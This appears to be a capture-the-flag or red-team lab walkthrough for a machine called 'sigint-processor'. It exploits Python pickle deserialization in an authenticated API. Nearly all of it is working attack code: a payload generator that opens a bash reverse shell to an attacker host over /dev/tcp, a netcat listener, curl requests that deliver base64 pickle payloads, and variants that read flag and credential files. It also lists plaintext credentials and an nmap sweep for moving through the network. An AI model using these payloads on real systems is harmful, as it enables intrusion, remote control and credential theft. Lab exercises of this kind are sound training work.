# Red Team — M4: sigint-processor

**Vulnerability:** Python Pickle Deserialization RCE
**Technique:** T1059.006 — Python
**Entry:** API token `DSRT-SIG-4a7f2c91` from M3's `/opt/gateway/config.json`

---

## Step 1 — Enumerate the API

```bash
curl -s http://<M4-IP>:5000/api/status | python3 -m json.tool
# Shows available endpoints and auth requirement

curl -s http://<M4-IP>:5000/api/signal/stats \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" | python3 -m json.tool
# Authenticated — works!
```

---

## Step 2 — Generate Malicious Pickle Payload

**On Kali / attack machine:**

```python
#!/usr/bin/env python3
# gen_payload.py
import pickle, os, base64

class RCE(object):
    def __reduce__(self):
        # Replace with your attacker IP and port
        cmd = "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

```bash
python3 gen_payload.py > payload.txt
cat payload.txt
```

---

## Step 3 — Start Listener

```bash
nc -lvnp 4444
```

---

## Step 4 — Send Malicious Payload

```bash
PAYLOAD=$(cat payload.txt)

curl -s -X POST http://<M4-IP>:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"${PAYLOAD}\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
```

You should receive a shell callback on port 4444.

---

## Step 5 — Read Flag and Archive Credentials

```bash
# From reverse shell:
cat /opt/sigproc/classified/flag4.txt
cat /opt/processor/conf/archive.conf
# Shows: archivist : Arch1v3@D3S3RT
```

---

## Step 6 — Discover M5

```bash
# From M4 shell:
ip route
nmap -p 22,2049 --open 195.0.0.0/8 --min-rate 2000
```

**Proceed to M5 with:** `archivist : Arch1v3@D3S3RT`
Also note M5's IP for NFS mount in Step 6 of M5.

#OR

# STEP 1: Generate payload file 
python3 << 'PYEOF' > /tmp/payload.txt
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/rce_proof.txt',))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF

echo "[*] Payload generated:"
cat /tmp/payload.txt

# STEP 2: Send payload 
curl -s -X POST http://172.24.4.209:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(cat /tmp/payload.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"

# Read flag4.txt
python3 << 'PYEOF' > /tmp/p_flag.txt
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/opt/sigproc/classified/flag4.txt'],))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF

curl -s -X POST http://172.24.4.209:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(cat /tmp/p_flag.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"

# Read archive.conf (M5 credentials) 
python3 << 'PYEOF' > /tmp/p_creds.txt
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/opt/processor/conf/archive.conf'],))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF

curl -s -X POST http://172.24.4.209:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(cat /tmp/p_creds.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
